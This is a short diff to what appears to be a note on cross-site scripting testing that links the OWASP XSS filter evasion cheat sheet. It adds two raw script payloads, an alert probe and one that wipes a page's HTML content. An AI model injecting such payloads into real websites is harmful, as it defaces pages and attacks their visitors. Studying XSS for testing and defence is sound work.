@@ -1,3 +1,4 @@
-comentar '<script>alert(123)</script>'
+<script>alert(123)</script>
+<script>document.querySelector('html').innerHTML = ''</script>
 
 https://owasp.org/www-community/xss-filter-evasion-cheatsheet
